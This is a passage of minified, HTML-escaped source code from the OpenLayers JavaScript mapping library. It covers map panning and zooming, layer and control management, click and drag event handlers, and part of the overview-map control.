b=this.getCachedCenter(),c=OpenLayers.Util.getResolutionFromScale(this.getScale(),a.units);null==this.baseLayer||this.allOverlays||this.baseLayer.setVisibility(!1);this.baseLayer=a;if(!this.allOverlays||this.baseLayer.visibility)this.baseLayer.setVisibility(!0), !1===this.baseLayer.inRange&amp;&amp;this.baseLayer.redraw();null!=b&amp;&amp;(a=this.getZoomForResolution(c||this.resolution,!0),this.setCenter(b,a,!1,!0));this.events.triggerEvent("changebaselayer",{layer:this.baseLayer})}},addControl:function(a,b){this.controls.push(a);this.addControlToMap(a,b)},addControls:function(a,b){for(var c=1===arguments.length?[]:b,d=0,e=a.length;d&lt;e;d++)this.addControl(a[d],c[d]?c[d]:null)},addControlToMap:function(a,b){a.outsideViewport=null!=a.div;this.displayProjection&amp;&amp;!a.displayProjection&amp;&amp; (a.displayProjection=this.displayProjection);a.setMap(this);var c=a.draw(b);c&amp;&amp;!a.outsideViewport&amp;&amp;(c.style.zIndex=this.Z_INDEX_BASE.Control+this.controls.length,this.viewPortDiv.appendChild(c));a.autoActivate&amp;&amp;a.activate()},getControl:function(a){for(var b=null,c=0,d=this.controls.length;c&lt;d;c++){var e=this.controls[c];if(e.id==a){b=e;break}}return b},removeControl:function(a){a&amp;&amp;a==this.getControl(a.id)&amp;&amp;(a.div&amp;&amp;a.div.parentNode==this.viewPortDiv&amp;&amp;this.viewPortDiv.removeChild(a.div),OpenLayers.Util.removeItem(this.controls, a))},addPopup:function(a,b){if(b)for(var c=this.popups.length-1;0&lt;=c;--c)this.removePopup(this.popups[c]);a.map=this;this.popups.push(a);if(c=a.draw())c.style.zIndex=this.Z_INDEX_BASE.Popup+this.popups.length,this.layerContainerDiv.appendChild(c)},removePopup:function(a){OpenLayers.Util.removeItem(this.popups,a);if(a.div)try{this.layerContainerDiv.removeChild(a.div)}catch(b){}a.map=null},getSize:function(){var a=null;null!=this.size&amp;&amp;(a=this.size.clone());return a},updateSize:function(){var a=this.getCurrentSize(); if(a&amp;&amp;!isNaN(a.h)&amp;&amp;!isNaN(a.w)){this.events.clearMouseCache();var b=this.getSize();null==b&amp;&amp;(this.size=b=a);if(!a.equals(b)){this.size=a;a=0;for(b=this.layers.length;a&lt;b;a++)this.layers[a].onMapResize();a=this.getCachedCenter();null!=this.baseLayer&amp;&amp;null!=a&amp;&amp;(b=this.getZoom(),this.zoom=null,this.setCenter(a,b))}}this.events.triggerEvent("updatesize")},getCurrentSize:function(){var a=new OpenLayers.Size(this.div.clientWidth,this.div.clientHeight);if(0==a.w&amp;&amp;0==a.h||isNaN(a.w)&amp;&amp;isNaN(a.h))a.w=this.div.offsetWidth, a.h=this.div.offsetHeight;if(0==a.w&amp;&amp;0==a.h||isNaN(a.w)&amp;&amp;isNaN(a.h))a.w=parseInt(this.div.style.width),a.h=parseInt(this.div.style.height);return a},calculateBounds:function(a,b){var c=null;null==a&amp;&amp;(a=this.getCachedCenter());null==b&amp;&amp;(b=this.getResolution());if(null!=a&amp;&amp;null!=b)var c=this.size.w*b/2,d=this.size.h*b/2,c=new OpenLayers.Bounds(a.lon-c,a.lat-d,a.lon+c,a.lat+d);return c},getCenter:function(){var a=null,b=this.getCachedCenter();b&amp;&amp;(a=b.clone());return a},getCachedCenter:function(){!this.center&amp;&amp; this.size&amp;&amp;(this.center=this.getLonLatFromViewPortPx({x:this.size.w/2,y:this.size.h/2}));return this.center},getZoom:function(){return this.zoom},pan:function(a,b,c){c=OpenLayers.Util.applyDefaults(c,{animate:!0,dragging:!1});if(c.dragging)0==a&amp;&amp;0==b||this.moveByPx(a,b);else{var d=this.getViewPortPxFromLonLat(this.getCachedCenter());a=d.add(a,b);if(this.dragging||!a.equals(d))d=this.getLonLatFromViewPortPx(a),c.animate?this.panTo(d):(this.moveTo(d),this.dragging&amp;&amp;(this.dragging=!1,this.events.triggerEvent("moveend")))}}, panTo:function(a){if(this.panTween&amp;&amp;this.getExtent().scale(this.panRatio).containsLonLat(a)){var b=this.getCachedCenter();if(!a.equals(b)){var b=this.getPixelFromLonLat(b),c=this.getPixelFromLonLat(a),d=0,e=0;this.panTween.start({x:0,y:0},{x:c.x-b.x,y:c.y-b.y},this.panDuration,{callbacks:{eachStep:OpenLayers.Function.bind(function(a){this.moveByPx(a.x-d,a.y-e);d=Math.round(a.x);e=Math.round(a.y)},this),done:OpenLayers.Function.bind(function(b){this.moveTo(a);this.dragging=!1;this.events.triggerEvent("moveend")}, this)}})}}else this.setCenter(a)},setCenter:function(a,b,c,d){this.panTween&amp;&amp;this.panTween.stop();this.zoomTween&amp;&amp;this.zoomTween.stop();this.moveTo(a,b,{dragging:c,forceZoomChange:d})},moveByPx:function(a,b){var c=this.size.w/2,d=this.size.h/2,e=c+a,f=d+b,g=this.baseLayer.wrapDateLine,h=0,k=0;this.restrictedExtent&amp;&amp;(h=c,k=d,g=!1);a=g||e&lt;=this.maxPx.x-h&amp;&amp;e>=this.minPx.x+h?Math.round(a):0;b=f&lt;=this.maxPx.y-k&amp;&amp;f>=this.minPx.y+k?Math.round(b):0;if(a||b){this.dragging||(this.dragging=!0,this.events.triggerEvent("movestart")); this.center=null;a&amp;&amp;(this.layerContainerOriginPx.x-=a,this.minPx.x-=a,this.maxPx.x-=a);b&amp;&amp;(this.layerContainerOriginPx.y-=b,this.minPx.y-=b,this.maxPx.y-=b);this.applyTransform();d=0;for(e=this.layers.length;d&lt;e;++d)c=this.layers[d],c.visibility&amp;&amp;(c===this.baseLayer||c.inRange)&amp;&amp;(c.moveByPx(a,b),c.events.triggerEvent("move"));this.events.triggerEvent("move")}},adjustZoom:function(a){if(this.baseLayer&amp;&amp;this.baseLayer.wrapDateLine){var b=this.baseLayer.resolutions,c=this.getMaxExtent().getWidth()/this.size.w; if(this.getResolutionForZoom(a)>c)if(this.fractionalZoom)a=this.getZoomForResolution(c);else for(var d=a|0,e=b.length;d&lt;e;++d)if(b[d]&lt;=c){a=d;break}}return a},getMinZoom:function(){return this.adjustZoom(0)},moveTo:function(a,b,c){null==a||a instanceof OpenLayers.LonLat||(a=new OpenLayers.LonLat(a));c||(c={});null!=b&amp;&amp;(b=parseFloat(b),this.fractionalZoom||(b=Math.round(b)));var d=b;b=this.adjustZoom(b);b!==d&amp;&amp;(a=this.getCenter());var d=c.dragging||this.dragging,e=c.forceZoomChange;this.getCachedCenter()|| this.isValidLonLat(a)||(a=this.maxExtent.getCenterLonLat(),this.center=a.clone());if(null!=this.restrictedExtent){null==a&amp;&amp;(a=this.center);null==b&amp;&amp;(b=this.getZoom());var f=this.getResolutionForZoom(b),f=this.calculateBounds(a,f);if(!this.restrictedExtent.containsBounds(f)){var g=this.restrictedExtent.getCenterLonLat();f.getWidth()>this.restrictedExtent.getWidth()?a=new OpenLayers.LonLat(g.lon,a.lat):f.left&lt;this.restrictedExtent.left?a=a.add(this.restrictedExtent.left-f.left,0):f.right>this.restrictedExtent.right&amp;&amp; (a=a.add(this.restrictedExtent.right-f.right,0));f.getHeight()>this.restrictedExtent.getHeight()?a=new OpenLayers.LonLat(a.lon,g.lat):f.bottom&lt;this.restrictedExtent.bottom?a=a.add(0,this.restrictedExtent.bottom-f.bottom):f.top>this.restrictedExtent.top&amp;&amp;(a=a.add(0,this.restrictedExtent.top-f.top))}}e=e||this.isValidZoomLevel(b)&amp;&amp;b!=this.getZoom();f=this.isValidLonLat(a)&amp;&amp;!a.equals(this.center);if(e||f||d){d||this.events.triggerEvent("movestart",{zoomChanged:e});f&amp;&amp;(!e&amp;&amp;this.center&amp;&amp;this.centerLayerContainer(a), this.center=a.clone());a=e?this.getResolutionForZoom(b):this.getResolution();if(e||null==this.layerContainerOrigin){this.layerContainerOrigin=this.getCachedCenter();this.layerContainerOriginPx.x=0;this.layerContainerOriginPx.y=0;this.applyTransform();var f=this.getMaxExtent({restricted:!0}),h=f.getCenterLonLat(),g=this.center.lon-h.lon,h=h.lat-this.center.lat,k=Math.round(f.getWidth()/a),l=Math.round(f.getHeight()/a);this.minPx={x:(this.size.w-k)/2-g/a,y:(this.size.h-l)/2-h/a};this.maxPx={x:this.minPx.x+ Math.round(f.getWidth()/a),y:this.minPx.y+Math.round(f.getHeight()/a)}}e&amp;&amp;(this.zoom=b,this.resolution=a);a=this.getExtent();this.baseLayer.visibility&amp;&amp;(this.baseLayer.moveTo(a,e,c.dragging),c.dragging||this.baseLayer.events.triggerEvent("moveend",{zoomChanged:e}));a=this.baseLayer.getExtent();for(b=this.layers.length-1;0&lt;=b;--b)f=this.layers[b],f===this.baseLayer||f.isBaseLayer||(g=f.calculateInRange(),f.inRange!=g&amp;&amp;((f.inRange=g)||f.display(!1),this.events.triggerEvent("changelayer",{layer:f,property:"visibility"})), g&amp;&amp;f.visibility&amp;&amp;(f.moveTo(a,e,c.dragging),c.dragging||f.events.triggerEvent("moveend",{zoomChanged:e})));this.events.triggerEvent("move");d||this.events.triggerEvent("moveend");if(e){b=0;for(c=this.popups.length;b&lt;c;b++)this.popups[b].updatePosition();this.events.triggerEvent("zoomend")}}},centerLayerContainer:function(a){var b=this.getViewPortPxFromLonLat(this.layerContainerOrigin),c=this.getViewPortPxFromLonLat(a);if(null!=b&amp;&amp;null!=c){var d=this.layerContainerOriginPx.x;a=this.layerContainerOriginPx.y; var e=Math.round(b.x-c.x),b=Math.round(b.y-c.y);this.applyTransform(this.layerContainerOriginPx.x=e,this.layerContainerOriginPx.y=b);d-=e;a-=b;this.minPx.x-=d;this.maxPx.x-=d;this.minPx.y-=a;this.maxPx.y-=a}},isValidZoomLevel:function(a){return null!=a&amp;&amp;0&lt;=a&amp;&amp;a&lt;this.getNumZoomLevels()},isValidLonLat:function(a){var b=!1;null!=a&amp;&amp;(b=this.getMaxExtent(),b=b.containsLonLat(a,{worldBounds:this.baseLayer.wrapDateLine&amp;&amp;b}));return b},getProjection:function(){var a=this.getProjectionObject();return a?a.getCode(): null},getProjectionObject:function(){var a=null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.projection);return a},getMaxResolution:function(){var a=null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.maxResolution);return a},getMaxExtent:function(a){var b=null;a&amp;&amp;a.restricted&amp;&amp;this.restrictedExtent?b=this.restrictedExtent:null!=this.baseLayer&amp;&amp;(b=this.baseLayer.maxExtent);return b},getNumZoomLevels:function(){var a=null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.numZoomLevels);return a},getExtent:function(){var a= null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.getExtent());return a},getResolution:function(){var a=null;null!=this.baseLayer?a=this.baseLayer.getResolution():!0===this.allOverlays&amp;&amp;0&lt;this.layers.length&amp;&amp;(a=this.layers[0].getResolution());return a},getUnits:function(){var a=null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.units);return a},getScale:function(){var a=null;null!=this.baseLayer&amp;&amp;(a=this.getResolution(),a=OpenLayers.Util.getScaleFromResolution(a,this.baseLayer.units));return a},getZoomForExtent:function(a, b){var c=null;null!=this.baseLayer&amp;&amp;(c=this.baseLayer.getZoomForExtent(a,b));return c},getResolutionForZoom:function(a){var b=null;this.baseLayer&amp;&amp;(b=this.baseLayer.getResolutionForZoom(a));return b},getZoomForResolution:function(a,b){var c=null;null!=this.baseLayer&amp;&amp;(c=this.baseLayer.getZoomForResolution(a,b));return c},zoomTo:function(a,b){var c=this;if(c.isValidZoomLevel(a))if(c.baseLayer.wrapDateLine&amp;&amp;(a=c.adjustZoom(a)),c.zoomTween){var d=c.getResolution(),e=c.getResolutionForZoom(a),f={scale:1}, d={scale:d/e};c.zoomTween.playing&amp;&amp;c.zoomTween.duration&lt;3*c.zoomDuration?c.zoomTween.finish={scale:c.zoomTween.finish.scale*d.scale}:(b||(e=c.getSize(),b={x:e.w/2,y:e.h/2}),c.zoomTween.start(f,d,c.zoomDuration,{minFrameRate:50,callbacks:{eachStep:function(a){var d=c.layerContainerOriginPx;a=a.scale;c.applyTransform(d.x+((a-1)*(d.x-b.x)|0),d.y+((a-1)*(d.y-b.y)|0),a)},done:function(a){c.applyTransform();a=c.getResolution()/a.scale;var d=c.getZoomForResolution(a,!0);c.moveTo(c.getZoomTargetCenter(b, a),d,!0)}}}))}else f=b?c.getZoomTargetCenter(b,c.getResolutionForZoom(a)):null,c.setCenter(f,a)},zoomIn:function(){this.zoomTo(this.getZoom()+1)},zoomOut:function(){this.zoomTo(this.getZoom()-1)},zoomToExtent:function(a,b){a instanceof OpenLayers.Bounds||(a=new OpenLayers.Bounds(a));var c=a.getCenterLonLat();if(this.baseLayer.wrapDateLine){c=this.getMaxExtent();for(a=a.clone();a.right&lt;a.left;)a.right+=c.getWidth();c=a.getCenterLonLat().wrapDateLine(c)}this.setCenter(c,this.getZoomForExtent(a,b))}, zoomToMaxExtent:function(a){a=this.getMaxExtent({restricted:a?a.restricted:!0});this.zoomToExtent(a)},zoomToScale:function(a,b){var c=OpenLayers.Util.getResolutionFromScale(a,this.baseLayer.units),d=this.size.w*c/2,c=this.size.h*c/2,e=this.getCachedCenter(),d=new OpenLayers.Bounds(e.lon-d,e.lat-c,e.lon+d,e.lat+c);this.zoomToExtent(d,b)},getLonLatFromViewPortPx:function(a){var b=null;null!=this.baseLayer&amp;&amp;(b=this.baseLayer.getLonLatFromViewPortPx(a));return b},getViewPortPxFromLonLat:function(a){var b= null;null!=this.baseLayer&amp;&amp;(b=this.baseLayer.getViewPortPxFromLonLat(a));return b},getZoomTargetCenter:function(a,b){var c=null,d=this.getSize(),e=d.w/2-a.x,d=a.y-d.h/2,f=this.getLonLatFromPixel(a);f&amp;&amp;(c=new OpenLayers.LonLat(f.lon+e*b,f.lat+d*b));return c},getLonLatFromPixel:function(a){return this.getLonLatFromViewPortPx(a)},getPixelFromLonLat:function(a){a=this.getViewPortPxFromLonLat(a);a.x=Math.round(a.x);a.y=Math.round(a.y);return a},getGeodesicPixelSize:function(a){var b=a?this.getLonLatFromPixel(a): this.getCachedCenter()||new OpenLayers.LonLat(0,0),c=this.getResolution();a=b.add(-c/2,0);var d=b.add(c/2,0),e=b.add(0,-c/2),b=b.add(0,c/2),c=new OpenLayers.Projection("EPSG:4326"),f=this.getProjectionObject()||c;f.equals(c)||(a.transform(f,c),d.transform(f,c),e.transform(f,c),b.transform(f,c));return new OpenLayers.Size(OpenLayers.Util.distVincenty(a,d),OpenLayers.Util.distVincenty(e,b))},getViewPortPxFromLayerPx:function(a){var b=null;null!=a&amp;&amp;(b=a.add(this.layerContainerOriginPx.x,this.layerContainerOriginPx.y)); return b},getLayerPxFromViewPortPx:function(a){var b=null;null!=a&amp;&amp;(b=a.add(-this.layerContainerOriginPx.x,-this.layerContainerOriginPx.y),isNaN(b.x)||isNaN(b.y))&amp;&amp;(b=null);return b},getLonLatFromLayerPx:function(a){a=this.getViewPortPxFromLayerPx(a);return this.getLonLatFromViewPortPx(a)},getLayerPxFromLonLat:function(a){a=this.getPixelFromLonLat(a);return this.getLayerPxFromViewPortPx(a)},applyTransform:function(a,b,c){c=c||1;var d=this.layerContainerOriginPx,e=1!==c;a=a||d.x;b=b||d.y;var f=this.layerContainerDiv.style, g=this.applyTransform.transform,h=this.applyTransform.template;if(void 0===g&amp;&amp;(g=OpenLayers.Util.vendorPrefix.style("transform"),this.applyTransform.transform=g)){var k=OpenLayers.Element.getStyle(this.viewPortDiv,OpenLayers.Util.vendorPrefix.css("transform"));k&amp;&amp;"none"===k||(h=["translate3d(",",0) ","scale3d(",",1)"],f[g]=[h[0],"0,0",h[1]].join(""));h&amp;&amp;~f[g].indexOf(h[0])||(h=["translate(",") ","scale(",")"]);this.applyTransform.template=h}null===g||"translate3d("!==h[0]&amp;&amp;!0!==e?(f.left=a+"px",f.top= b+"px",null!==g&amp;&amp;(f[g]="")):(!0===e&amp;&amp;"translate("===h[0]&amp;&amp;(a-=d.x,b-=d.y,f.left=d.x+"px",f.top=d.y+"px"),f[g]=[h[0],a,"px,",b,"px",h[1],h[2],c,",",c,h[3]].join(""))},CLASS_NAME:"OpenLayers.Map"});OpenLayers.Map.TILE_WIDTH=256;OpenLayers.Map.TILE_HEIGHT=256;OpenLayers.Handler=OpenLayers.Class({id:null,control:null,map:null,keyMask:null,active:!1,evt:null,touch:!1,initialize:function(a,b,c){OpenLayers.Util.extend(this,c);this.control=a;this.callbacks=b;(a=this.map||a.map)&amp;&amp;this.setMap(a);this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")},setMap:function(a){this.map=a},checkModifiers:function(a){return null==this.keyMask?!0:((a.shiftKey?OpenLayers.Handler.MOD_SHIFT:0)|(a.ctrlKey?OpenLayers.Handler.MOD_CTRL:0)|(a.altKey?OpenLayers.Handler.MOD_ALT: 0)|(a.metaKey?OpenLayers.Handler.MOD_META:0))==this.keyMask},activate:function(){if(this.active)return!1;for(var a=OpenLayers.Events.prototype.BROWSER_EVENTS,b=0,c=a.length;b&lt;c;b++)this[a[b]]&amp;&amp;this.register(a[b],this[a[b]]);return this.active=!0},deactivate:function(){if(!this.active)return!1;for(var a=OpenLayers.Events.prototype.BROWSER_EVENTS,b=0,c=a.length;b&lt;c;b++)this[a[b]]&amp;&amp;this.unregister(a[b],this[a[b]]);this.active=this.touch=!1;return!0},startTouch:function(){if(!this.touch){this.touch=!0; for(var a="mousedown mouseup mousemove click dblclick mouseout".split(" "),b=0,c=a.length;b&lt;c;b++)this[a[b]]&amp;&amp;this.unregister(a[b],this[a[b]])}},callback:function(a,b){a&amp;&amp;this.callbacks[a]&amp;&amp;this.callbacks[a].apply(this.control,b)},register:function(a,b){this.map.events.registerPriority(a,this,b);this.map.events.registerPriority(a,this,this.setEvent)},unregister:function(a,b){this.map.events.unregister(a,this,b);this.map.events.unregister(a,this,this.setEvent)},setEvent:function(a){this.evt=a;return!0}, destroy:function(){this.deactivate();this.control=this.map=null},CLASS_NAME:"OpenLayers.Handler"});OpenLayers.Handler.MOD_NONE=0;OpenLayers.Handler.MOD_SHIFT=1;OpenLayers.Handler.MOD_CTRL=2;OpenLayers.Handler.MOD_ALT=4;OpenLayers.Handler.MOD_META=8;OpenLayers.Handler.Click=OpenLayers.Class(OpenLayers.Handler,{delay:300,single:!0,"double":!1,pixelTolerance:0,dblclickTolerance:13,stopSingle:!1,stopDouble:!1,timerId:null,down:null,last:null,first:null,rightclickTimerId:null,touchstart:function(a){this.startTouch();this.down=this.getEventInfo(a);this.last=this.getEventInfo(a);return!0},touchmove:function(a){this.last=this.getEventInfo(a);return!0},touchend:function(a){this.down&amp;&amp;(a.xy=this.last.xy,a.lastTouches=this.last.touches,this.handleSingle(a), this.down=null);return!0},mousedown:function(a){this.down=this.getEventInfo(a);this.last=this.getEventInfo(a);return!0},mouseup:function(a){var b=!0;this.checkModifiers(a)&amp;&amp;(this.control.handleRightClicks&amp;&amp;OpenLayers.Event.isRightClick(a))&amp;&amp;(b=this.rightclick(a));return b},rightclick:function(a){if(this.passesTolerance(a)){if(null!=this.rightclickTimerId)return this.clearTimer(),this.callback("dblrightclick",[a]),!this.stopDouble;a=this["double"]?OpenLayers.Util.extend({},a):this.callback("rightclick", [a]);a=OpenLayers.Function.bind(this.delayedRightCall,this,a);this.rightclickTimerId=window.setTimeout(a,this.delay)}return!this.stopSingle},delayedRightCall:function(a){this.rightclickTimerId=null;a&amp;&amp;this.callback("rightclick",[a])},click:function(a){this.last||(this.last=this.getEventInfo(a));this.handleSingle(a);return!this.stopSingle},dblclick:function(a){this.handleDouble(a);return!this.stopDouble},handleDouble:function(a){this.passesDblclickTolerance(a)&amp;&amp;(this["double"]&amp;&amp;this.callback("dblclick", [a]),this.clearTimer())},handleSingle:function(a){this.passesTolerance(a)&amp;&amp;(null!=this.timerId?(this.last.touches&amp;&amp;1===this.last.touches.length&amp;&amp;(this["double"]&amp;&amp;OpenLayers.Event.preventDefault(a),this.handleDouble(a)),this.last.touches&amp;&amp;2===this.last.touches.length||this.clearTimer()):(this.first=this.getEventInfo(a),a=this.single?OpenLayers.Util.extend({},a):null,this.queuePotentialClick(a)))},queuePotentialClick:function(a){this.timerId=window.setTimeout(OpenLayers.Function.bind(this.delayedCall, this,a),this.delay)},passesTolerance:function(a){var b=!0;if(null!=this.pixelTolerance&amp;&amp;this.down&amp;&amp;this.down.xy&amp;&amp;(b=this.pixelTolerance>=this.down.xy.distanceTo(a.xy))&amp;&amp;this.touch&amp;&amp;this.down.touches.length===this.last.touches.length){a=0;for(var c=this.down.touches.length;a&lt;c;++a)if(this.getTouchDistance(this.down.touches[a],this.last.touches[a])>this.pixelTolerance){b=!1;break}}return b},getTouchDistance:function(a,b){return Math.sqrt(Math.pow(a.clientX-b.clientX,2)+Math.pow(a.clientY-b.clientY, 2))},passesDblclickTolerance:function(a){a=!0;this.down&amp;&amp;this.first&amp;&amp;(a=this.down.xy.distanceTo(this.first.xy)&lt;=this.dblclickTolerance);return a},clearTimer:function(){null!=this.timerId&amp;&amp;(window.clearTimeout(this.timerId),this.timerId=null);null!=this.rightclickTimerId&amp;&amp;(window.clearTimeout(this.rightclickTimerId),this.rightclickTimerId=null)},delayedCall:function(a){this.timerId=null;a&amp;&amp;this.callback("click",[a])},getEventInfo:function(a){var b;if(a.touches){var c=a.touches.length;b=Array(c);for(var d, e=0;e&lt;c;e++)d=a.touches[e],b[e]={clientX:d.olClientX,clientY:d.olClientY}}return{xy:a.xy,touches:b}},deactivate:function(){var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.clearTimer(),this.last=this.first=this.down=null,a=!0);return a},CLASS_NAME:"OpenLayers.Handler.Click"});OpenLayers.Handler.Drag=OpenLayers.Class(OpenLayers.Handler,{started:!1,stopDown:!0,dragging:!1,last:null,start:null,lastMoveEvt:null,oldOnselectstart:null,interval:0,timeoutId:null,documentDrag:!1,documentEvents:null,initialize:function(a,b,c){OpenLayers.Handler.prototype.initialize.apply(this,arguments);if(!0===this.documentDrag){var d=this;this._docMove=function(a){d.mousemove({xy:{x:a.clientX,y:a.clientY},element:document})};this._docUp=function(a){d.mouseup({xy:{x:a.clientX,y:a.clientY}})}}}, dragstart:function(a){var b=!0;this.dragging=!1;this.checkModifiers(a)&amp;&amp;(OpenLayers.Event.isLeftClick(a)||OpenLayers.Event.isSingleTouch(a))?(this.started=!0,this.last=this.start=a.xy,OpenLayers.Element.addClass(this.map.viewPortDiv,"olDragDown"),this.down(a),this.callback("down",[a.xy]),OpenLayers.Event.preventDefault(a),this.oldOnselectstart||(this.oldOnselectstart=document.onselectstart?document.onselectstart:OpenLayers.Function.True),document.onselectstart=OpenLayers.Function.False,b=!this.stopDown): (this.started=!1,this.last=this.start=null);return b},dragmove:function(a){this.lastMoveEvt=a;!this.started||(this.timeoutId||a.xy.x==this.last.x&amp;&amp;a.xy.y==this.last.y)||(!0===this.documentDrag&amp;&amp;this.documentEvents&amp;&amp;(a.element===document?(this.adjustXY(a),this.setEvent(a)):this.removeDocumentEvents()),0&lt;this.interval&amp;&amp;(this.timeoutId=setTimeout(OpenLayers.Function.bind(this.removeTimeout,this),this.interval)),this.dragging=!0,this.move(a),this.callback("move",[a.xy]),this.oldOnselectstart||(this.oldOnselectstart= document.onselectstart,document.onselectstart=OpenLayers.Function.False),this.last=a.xy);return!0},dragend:function(a){if(this.started){!0===this.documentDrag&amp;&amp;this.documentEvents&amp;&amp;(this.adjustXY(a),this.removeDocumentEvents());var b=this.start!=this.last;this.dragging=this.started=!1;OpenLayers.Element.removeClass(this.map.viewPortDiv,"olDragDown");this.up(a);this.callback("up",[a.xy]);b&amp;&amp;this.callback("done",[a.xy]);document.onselectstart=this.oldOnselectstart}return!0},down:function(a){},move:function(a){}, up:function(a){},out:function(a){},mousedown:function(a){return this.dragstart(a)},touchstart:function(a){this.startTouch();return this.dragstart(a)},mousemove:function(a){return this.dragmove(a)},touchmove:function(a){return this.dragmove(a)},removeTimeout:function(){this.timeoutId=null;this.dragging&amp;&amp;this.mousemove(this.lastMoveEvt)},mouseup:function(a){return this.dragend(a)},touchend:function(a){a.xy=this.last;return this.dragend(a)},mouseout:function(a){if(this.started&amp;&amp;OpenLayers.Util.mouseLeft(a, this.map.viewPortDiv))if(!0===this.documentDrag)this.addDocumentEvents();else{var b=this.start!=this.last;this.dragging=this.started=!1;OpenLayers.Element.removeClass(this.map.viewPortDiv,"olDragDown");this.out(a);this.callback("out",[]);b&amp;&amp;this.callback("done",[a.xy]);document.onselectstart&amp;&amp;(document.onselectstart=this.oldOnselectstart)}return!0},click:function(a){return this.start==this.last},activate:function(){var a=!1;OpenLayers.Handler.prototype.activate.apply(this,arguments)&amp;&amp;(this.dragging= !1,a=!0);return a},deactivate:function(){var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.dragging=this.started=!1,this.last=this.start=null,a=!0,OpenLayers.Element.removeClass(this.map.viewPortDiv,"olDragDown"));return a},adjustXY:function(a){var b=OpenLayers.Util.pagePosition(this.map.viewPortDiv);a.xy.x-=b[0];a.xy.y-=b[1]},addDocumentEvents:function(){OpenLayers.Element.addClass(document.body,"olDragDown");this.documentEvents=!0;OpenLayers.Event.observe(document,"mousemove", this._docMove);OpenLayers.Event.observe(document,"mouseup",this._docUp)},removeDocumentEvents:function(){OpenLayers.Element.removeClass(document.body,"olDragDown");this.documentEvents=!1;OpenLayers.Event.stopObserving(document,"mousemove",this._docMove);OpenLayers.Event.stopObserving(document,"mouseup",this._docUp)},CLASS_NAME:"OpenLayers.Handler.Drag"});OpenLayers.Control.OverviewMap=OpenLayers.Class(OpenLayers.Control,{element:null,ovmap:null,size:{w:180,h:90},layers:null,minRectSize:15,minRectDisplayClass:"RectReplacement",minRatio:8,maxRatio:32,mapOptions:null,autoPan:!1,handlers:null,resolutionFactor:1,maximized:!1,maximizeTitle:"",minimizeTitle:"",initialize:function(a){this.layers=[];this.handlers={};OpenLayers.Control.prototype.initialize.apply(this,[a])},destroy:function(){this.mapDiv&amp;&amp;(this.handlers.click&amp;&amp;this.handlers.click.destroy(), this.handlers.drag&amp;&amp;this.handlers.drag.destroy(),this.ovmap&amp;&amp;this.ovmap.viewPortDiv.removeChild(this.extentRectangle),this.extentRectangle=null,this.rectEvents&amp;&amp;(this.rectEvents.destroy(),this.rectEvents=null),this.ovmap&amp;&amp;(this.ovmap.destroy(),this.ovmap=null),this.element.removeChild(this.mapDiv),this.mapDiv=null,this.div.removeChild(this.element),this.element=null,this.maximizeDiv&amp;&amp;(this.div.removeChild(this.maximizeDiv),this.maximizeDiv=null),this.minimizeDiv&amp;&amp;(this.div.removeChild(this.minimizeDiv), this.minimizeDiv=null),this.map.events.un({buttonclick:this.onButtonClick,moveend:this.update,changebaselayer:this.baseLayerDraw,scope:this}),OpenLayers.Control.prototype.destroy.apply(this,arguments))},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);if(0===this.layers.length)if(this.map.baseLayer)this.layers=[this.map.baseLayer.clone()];else return this.map.events.register("changebaselayer",this,this.baseLayerDraw),this.div;this.element=document.createElement("div");this.element.className= this.displayClass+"Element";this.element.style.display="none";this.mapDiv=document.createElement("div");this.mapDiv.style.width=this.size.w+"px";this.mapDiv.style.height=this.size.h+"px";this.mapDiv.style.position="relative";this.mapDiv.style.overflow="hidden";this.mapDiv.id=OpenLayers.Util.createUniqueID("overviewMap");this.extentRectangle=document.createElement("div");this.extentRectangle.style.position="absolute";this.extentRectangle.style.zIndex=1E3;this.extentRectangle.className=this.displayClass+ "ExtentRectangle";this.element.appendChild(this.mapDiv);this.div.appendChild(this.element);if(this.outsideViewport)this.element.style.display="";else{this.div.className+=" "+this.displayClass+"Container";var a=OpenLayers.Util.getImageLocation("layer-switcher-maximize.png");this.maximizeDiv=OpenLayers.Util.createAlphaImageDiv(this.displayClass+"MaximizeButton",null,null,a,"absolute");this.maximizeDiv.style.display="none";this.maximizeDiv.className=this.displayClass+"MaximizeButton olButton";this.maximizeTitle&amp;&amp; (this.maximizeDiv.title=this.maximizeTitle);this.div.appendChild(this.maximizeDiv);a=OpenLayers.Util.getImageLocation("layer-switcher-minimize.png");this.minimizeDiv=OpenLayers.Util.createAlphaImageDiv("OpenLayers_Control_minimizeDiv",null,null,a,"absolute");this.minimizeDiv.style.display="none";this.minimizeDiv.className=this.displayClass+"MinimizeButton olButton";this.minimizeTitle&amp;&amp;(this.minimizeDiv.title=this.minimizeTitle);this.div.appendChild(this.minimizeDiv);this.minimizeControl()}this.map.getExtent()&amp;&amp; this.update();this.map.events.on({buttonclick:this.onButtonClick,moveend:this.update,scope:this});this.maximized&amp;&amp;this.maximizeControl();return this.div},baseLayerDraw:function(){this.draw();this.map.events.unregister("changebaselayer",this,this.baseLayerDraw)},rectDrag:function(a){var b=this.handlers.drag.last.x-a.x,c=this.handlers.drag.last.y-a.y;if(0!=b||0!=c){var d=this.rectPxBounds.top,e=this.rectPxBounds.left;a=Math.abs(this.rectPxBounds.getHeight());var f=this.rectPxBounds.getWidth(),c=Math.max(0, d-c),c=Math.min(c,this.ovmap.size.h-this.hComp-a),b=Math.max(0,e-b),b=Math.min(b,this.ovmap.size.w-this.wComp-f);this.setRectPxBounds(new OpenLayers.Bounds(b,c+a,b+f,c))}},mapDivClick:function(a){var b=this.rectPxBounds.getCenterPixel(),c=a.xy.x-b.x,d=a.xy.y-b.y,e=this.rectPxBounds.top,f=this.rectPxBounds.left;a=Math.abs(this.rectPxBounds.getHeight());b=this.rectPxBounds.getWidth();d=Math.max(0,e+d);d=Math.min(d,this.ovmap.size.h-a);c=Math.max(0,f+c);c=Math.min(c,this.ovmap.size.w-b);this.setRectPxBounds(new OpenLayers.Bounds(c, 